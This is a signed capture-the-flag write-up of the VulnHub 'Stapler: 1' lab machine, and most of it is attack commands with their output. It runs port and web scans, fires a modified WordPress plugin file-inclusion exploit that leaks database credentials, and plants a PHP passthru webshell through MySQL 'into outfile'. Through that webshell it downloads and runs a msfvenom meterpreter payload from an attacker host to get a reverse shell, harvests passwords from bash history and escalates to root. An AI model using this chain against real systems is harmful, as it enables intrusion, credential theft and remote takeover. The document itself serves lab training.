@@ -1,0 +1,414 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+# $Id: 2017_stapler-1.txt,v 1.0 2017/03/15 13:35:57 dhn Exp $
+
+Writeup Stapler: 1 [1]
+
+0x0) found the ports
+
+[dhn]::[~/dev/ctf/write_up/boot2root] export ip=174.0.42.6
+[dhn]::[~/dev/ctf/write_up/boot2root] nmap -A -T4 -p- $ip
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-15 07:34 EDT
+Nmap scan report for S0106185933402fbc.cg.shawcable.net (174.0.42.6)
+Host is up (0.00023s latency).
+Not shown: 65523 filtered ports
+PORT      STATE  SERVICE     VERSION
+20/tcp    closed ftp-data
+21/tcp    open   ftp         vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: Can't parse PASV response: "Permission denied."
+22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
+|_  256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
+53/tcp    open   domain      dnsmasq 2.75
+| dns-nsid:
+|_  bind.version: dnsmasq-2.75
+80/tcp    open   http
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.0 404 Not Found
+|     Connection: close
+|     Content-Type: text/html; charset=UTF-8
+|     Content-Length: 568
+|     <!doctype html><html><head><title>404 Not Found</title><style>
+|     body { background-color: #fcfcfc; color: #333333; margin: 0; padding:0; }
+|     font-size: 1.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; }
+|     padding-left: 10px; }
+|     code.url { background-color: #eeeeee; font-family:monospace; padding:0 2px;}
+|     </style>
+|     </head><body><h1>Not Found</h1><p>The requested resource <code class="url">/nice%20ports%2C/Tri%6Eity.txt%2ebak</code> was not found on this server.</p></body></html>
+|   GetRequest, HTTPOptions:
+|     HTTP/1.0 404 Not Found
+|     Connection: close
+|     Content-Type: text/html; charset=UTF-8
+|     Content-Length: 533
+|     <!doctype html><html><head><title>404 Not Found</title><style>
+|     body { background-color: #fcfcfc; color: #333333; margin: 0; padding:0; }
+|     font-size: 1.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; }
+|     padding-left: 10px; }
+|     code.url { background-color: #eeeeee; font-family:monospace; padding:0 2px;}
+|     </style>
+|_    </head><body><h1>Not Found</h1><p>The requested resource <code class="url">/</code> was not found on this server.</p></body></html>
+|_http-title: 404 Not Found
+123/tcp   closed ntp
+137/tcp   closed netbios-ns
+138/tcp   closed netbios-dgm
+139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
+666/tcp   open   doom?
+| fingerprint-strings:
+|   NULL:
+|     message2.jpgUT
+|     QWux
+|     "DL[E
+|     #;3[
+|     \xf6
+|     u([r
+|     qYQq
+|     Y_?n2
+|     3&M~{
+|     9-a)T
+|     L}AJ
+|_    .npy.9
+3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
+|_mysql-info: ERROR: Script execution failed (use -d to debug)
+12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Tim, we need to-do better next year for Initech
+...
+MAC Address: 00:0C:29:52:EF:A3 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.6
+Network Distance: 1 hop
+Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
+|   Computer name: red
+|   NetBIOS computer name: RED\x00
+|   Domain name: \x00
+|   FQDN: red
+|_  System time: 2017-03-15T11:36:17+00:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.23 ms S0106185933402fbc.cg.shawcable.net (174.0.42.6)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 236.29 seconds
+
+0x1) run nikto
+
+[dhn]::[~/dev/ctf/write_up/boot2root] nikto -h https://$ip:12380
+- - Nikto v2.1.6
+- ---------------------------------------------------------------------------
++ Target IP:          174.0.42.6
++ Target Hostname:    174.0.42.6
++ Target Port:        12380
+- ---------------------------------------------------------------------------
++ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
++ Start Time:         2017-02-07 15:06:15 (GMT1)
+- ---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 2 entries which should be manually viewed.
++ Hostname '174.0.42.6' does not match certificate's names: Red.Initech
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
++ Uncommon header 'x-ob_mode' found, with contents: 1
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ 7690 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2017-02-07 15:08:41 (GMT1) (146 seconds)
+- ---------------------------------------------------------------------------
++ 1 host(s) tested
+
+0x2) open firefox and go to https://$ip:12380/blogblog/
+
+0x3) discover that https://$ip:12380/blogblog/wp-content/plugins/ allows indexing...
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl https://$ip:12380/blogblog/wp-content/plugins/ -k -s | html2text
+****** Index of /blogblog/wp-content/plugins ******
+[[ICO]]       Name                        Last_modified    Size Description
+===========================================================================
+[[PARENTDIR]] Parent_Directory                               -  
+[[DIR]]       advanced-video-embed-embed- 2015-10-14 13:52    -  
+              videos-or-playlists/
+[[   ]]       hello.php                   2016-06-03 23:40 2.2K  
+[[DIR]]       shortcode-ui/               2015-11-12 17:07    -  
+[[DIR]]       two-factor/                 2016-04-12 22:56    -  
+===========================================================================
+     Apache/2.4.18 (Ubuntu) Server at 174.0.42.6 Port 12380
+
+0x4) search for exploits
+
+[dhn]::[~/dev/ctf/write_up/boot2root] searchsploit advanced video
+- --------------------------------------------- ----------------------------------
+ Exploit Title                               |  Path
+                                             | (/usr/share/exploitdb/platforms)
+- --------------------------------------------- ----------------------------------
+WordPress Plugin Advanced Video 1.0 - Local  | /php/webapps/39646.py
+- --------------------------------------------- ----------------------------------
+
+0x5) modify and trigger the exploit
+
+[dhn]::[~/dev/ctf/write_up/boot2root] diff -ruN 39646.py.orig 39646.py
+- --- 39646.py.orig       2017-03-15 13:03:49.049281697 +0100
++++ 39646.py    2017-03-15 13:08:40.969292798 +0100
+@@ -33,8 +33,11 @@
+ import random
+ import urllib2
+ import re
++import ssl
+
+- -url = "http://127.0.0.1/wordpress" # insert url to wordpress
++ssl._create_default_https_context = ssl._create_unverified_context
++
++url = "https://174.0.42.6:12380/blogblog" # insert url to wordpress
+
+ randomID = long(random.random() * 100000000000000000L)
+
+@@ -51,4 +54,4 @@
+ for line in content:
+        if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
+                urls=re.findall('"(https?://.*?)"', line)
+- -               print urllib2.urlopen(urls[0]).read()
+\ No newline at end of file
++               print urllib2.urlopen(urls[0]).read()
+
+[dhn]::[~/dev/ctf/write_up/boot2root] python 39646.py
+...
+
+0x6) use the lfi
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl https://$ip:12380/blogblog/wp-content/uploads/1031875.jpeg -k -s | head -n30
+<?php
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, and ABSPATH. You can find more information by visiting
+ * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
+ * Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to "wp-config.php" and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'plbkac');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+
+0x7) take the leaked password and connect to the mysql server
+
+[dhn]::[~/dev/ctf/write_up/boot2root] mysql -u root -p -h $ip
+Enter password:
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 191415
+Server version: 5.7.12-0ubuntu1 (Ubuntu)
+
+Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+mysql>
+
+0x8) create an webshell via 'into outfile' mechanism
+
+mysql> select "<?php passthru($_GET['cmd']); ?>" into outfile '/var/www/https/blogblog/wp-content/uploads/sh.php';
+Query OK, 1 row affected (0.03 sec)
+
+mysql> exit
+Bye
+
+0x9) test the webshell
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -k -s https://$ip:12380/blogblog/wp-content/uploads/sh.php?c=uname+-a
+Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
+
+0xa) create meterpreter and start multi handler
+
+[dhn]::[~/dev/ctf/write_up/boot2root] msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform linux -b '\\x00' LHOST="10.9.0.2" LPORT=7766 -f elf -o dhn
+Found 10 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 98 (iteration=0)
+x86/shikata_ga_nai chosen with final size 98
+Payload size: 98 bytes
+Final size of elf file: 182 bytes
+Saved as: dhn
+
+0xb) use the webshell to download and execute the meterpreter
+
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -k -s https://$ip:12380/blogblog/wp-content/uploads/sh.php?c=wget+http://10.9.0.2:8000/dhn+-O+/tmp/evil
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -k -s https://$ip:12380/blogblog/wp-content/uploads/sh.php?c=chmod+777+/tmp/evil
+[dhn]::[~/dev/ctf/write_up/boot2root] curl -k -s https://$ip:12380/blogblog/wp-content/uploads/sh.php?c=bash+-c+/tmp/evil
+
+0xc) gathering information
+
+msf exploit(handler) > run
+
+[*] Started reverse TCP handler on 10.9.0.2:7766
+[*] Starting the payload handler...
+[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
+[*] Sending stage (1495599 bytes) to 174.0.42.6
+[*] Meterpreter session 3 opened (10.9.0.2:7766 -> 174.0.42.6:46278) at 2017-02-08 11:45:23 +0100
+
+meterpreter > sysinfo
+Computer     : red.initech
+OS           : Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 (i686)
+Architecture : i686
+Meterpreter  : x86/linux
+meterpreter > cd /home//JKanode
+meterpreter > ls
+Listing: /home/JKanode
+======================
+
+Mode              Size  Type  Last modified              Name
+- ----              ----  ----  -------------              ----
+100644/rw-r--r--  167   fil   2016-06-05 19:25:05 +0200  .bash_history
+100644/rw-r--r--  220   fil   2015-09-01 01:26:22 +0200  .bash_logout
+100644/rw-r--r--  3771  fil   2015-09-01 01:26:22 +0200  .bashrc
+100644/rw-r--r--  675   fil   2015-09-01 01:26:22 +0200  .profile
+
+meterpreter > cat .bash_history
+id
+whoami
+ls -lah
+pwd
+ps aux
+sshpass -p thisimypassword ssh JKanode@localhost
+apt-get install sshpass
+sshpass -p JZQuyIN5 peter@localhost
+ps -ef
+top
+kill -9 3747
+exit
+
+0xd) use the leaked password
+
+[dhn]::[~/dev/ctf/write_up/boot2root] ssh -o PreferredAuthentications=keyboard-interactive,password -o PubkeyAuthentication=no peter@$ip
+- -----------------------------------------------------------------
+~          Barry, don't forget to put a message here           ~
+- -----------------------------------------------------------------
+peter@174.0.42.6's password:
+Welcome back!
+This is the Z Shell configuration function for new users,
+zsh-newuser-install.
+You are seeing this message because you have no zsh startup files
+(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
+~).  This function can help you with a few settings that should
+make your use of the shell easier.
+
+You can:
+
+(q)  Quit and do nothing.  The function will be run again next time.
+
+(0)  Exit, creating the file ~/.zshrc containing just a comment.
+     That will prevent this function being run again.
+
+(1)  Continue to the main menu.
+
+(2)  Populate your ~/.zshrc with the configuration recommended
+     by the system administrator and exit (you will need to edit
+     the file by hand, if so desired).
+
+- --- Type one of the keys in parentheses ---
+
+Aborting.
+The function will be run again next time.  To prevent this, execute:
+  touch ~/.zshrc
+
+red% id
+uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+
+0xe) captcha the flag via sudo
+
+red% sudo su
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for peter:
+➜  peter id
+uid=0(root) gid=0(root) groups=0(root)
+➜  peter cd /root/
+➜  ~ ls
+fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
+➜  ~ cat flag.txt
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+
+red%
+
+[1] https://www.vulnhub.com/entry/stapler-1,150/
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJYyTWaAAoJEKjdmUcmQRI8zZcQAMG5XpysNtjlbEewGqT/30wK
+fFaem/vQ3RKHa2tXvL0diAF5MCaWVNpydw7/tYV00FhHI+HcZaiu/CGZSeSv9D/Y
+wMClG5TDou0Yuu9usE8UjNmVetp3va4RkGfbWM20U2J+PuwulA94yIbcYE9kwaar
+lCYtc0ABeEOJJNuBeOiEUcmOPmZCh/TwkO4gtun2OeZ2uO3CR9fvH6sr7YjvqRAt
+EKrSO12AcTmfO0DFJqW18di3ULuZnV8dF7p6p8CbSt0mA+7vc5pw8HIW4xLyh8uY
+H471GmcWduCxz927MP+F9mZn0rV32rUfTvFfEPpjIS6Ci/MWCQupaItToCVmUmsh
+PyxEHduAfDRS7CTNU2DwwhhswYRRXvynN2ScD0+8jbTgTKmilshfcNc/xbUho6ph
+i2IhiBMioHs2uogSykjuRCcGtF1hc8Y7sXGOLcUb/ipr2I+/BGcU7ChjCF0Ou6Kt
+IEgNVHyi6eBv+ygINQe+HloVnKGROOAR0x4HSElWqdI4hUBtK9OBL/jhxDgFgyiK
+BfVEPR3ghTQt98vEnas8fjxYcv4SST6xMJWFHxOG++PvAo5wlxhQDJxrOVKdc/GO
+UC99+mzysvtw3wDV3VsrAzz8M/hj37jJJ1wxnB4JXdU9dgx+IpeNkieYycAS+rjT
+njubQJ4biFy6Sc0ZWNCQ
+=uSdn
+-----END PGP SIGNATURE-----
